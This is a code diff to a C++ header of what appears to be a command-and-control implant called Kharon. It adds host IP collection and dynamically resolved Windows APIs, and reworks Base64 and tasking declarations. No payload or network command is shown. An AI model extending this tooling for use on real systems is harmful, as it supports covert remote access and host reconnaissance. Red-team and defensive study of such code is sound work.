@@ -531,6 +531,7 @@ namespace Root {
             PCHAR UserName;
             PCHAR DomName;
             PCHAR NetBios;
+            ULONG IpAddress;
             PCHAR ProcessorName;
             ULONG ProcessorsNbr;
             ULONG AvalRAM;
@@ -555,7 +556,6 @@ namespace Root {
             ULONG ThreadID;
             ULONG ProcessArch;
             PCHAR CommandLine;
-            PCHAR ImageName;
             PCHAR ImagePath;
             BOOL  Elevated;
             BOOL  Connected;
@@ -566,7 +566,6 @@ namespace Root {
             } Base;        
         } Session = {
             .HeapHandle = U_PTR( NtCurrentPeb()->ProcessHeap ),
-            .ImageName  = "None",
             .Connected  = FALSE,
         };
 
@@ -900,6 +899,7 @@ namespace Root {
             UPTR Handle;
 
             DECLAPI( RtlLookupFunctionEntry );
+            DECLAPI( RtlIpv4StringToAddressA );
 
             DECLAPI( RtlNtStatusToDosError );
             DECLAPI( DbgPrint );
@@ -976,6 +976,7 @@ namespace Root {
             DECLAPI( RtlDeleteCriticalSection );
         } Ntdll = {
             RSL_TYPE( RtlLookupFunctionEntry ),
+            RSL_TYPE( RtlIpv4StringToAddressA ),
 
             RSL_TYPE( RtlNtStatusToDosError ),
             RSL_TYPE( DbgPrint ),
@@ -1057,6 +1058,14 @@ namespace Root {
             DECLAPI( CommandLineToArgvW );
         } Shell32 = {
             RSL_TYPE( CommandLineToArgvW ),
+        };
+
+        struct {
+            UPTR Handle;
+
+            DECLAPI( GetAdaptersInfo );
+        } Iphlpapi = {
+            RSL_TYPE( GetAdaptersInfo )
         };
 
         struct {
@@ -1927,12 +1936,15 @@ private:
 public:
     Package( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    PPACKAGE Global = nullptr; // for temporary usage
+    PPACKAGE Shared = nullptr;
 
-    auto Base64Enc(
-        _In_ const unsigned char* in, 
-        _In_ SIZE_T len
-    ) -> char*;
+    auto Base64(
+        _In_      const PVOID in,
+        _In_      SIZE_T inlen,
+        _Out_opt_ PVOID  out,
+        _In_opt_  SIZE_T outlen,
+        _In_      Base64Action Action 
+    ) -> SIZE_T;
 
     auto SendOut(
         _In_ ULONG Type,
@@ -1951,22 +1963,6 @@ public:
         _In_ ULONG Type,
         _In_ CHAR* Message
     ) -> BOOL;
-
-    auto Base64Dec(
-        const char* in, 
-        unsigned char* out, 
-        SIZE_T outlen
-    ) -> INT;
-
-    auto b64IsValidChar(char c) -> INT;
-
-    auto Base64EncSize(
-        _In_ SIZE_T inlen
-    ) -> SIZE_T;
-
-    auto Base64DecSize(
-        _In_ const char* in
-    ) -> SIZE_T;
 
     auto Int16( 
         _In_ PPACKAGE Package, 
@@ -2049,7 +2045,7 @@ public:
     Parser( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
     BOOL    Endian = FALSE;
-    PPARSER Shared;
+    PPARSER Shared = nullptr;
 
     auto NewTask( 
         _In_ PPARSER parser, 
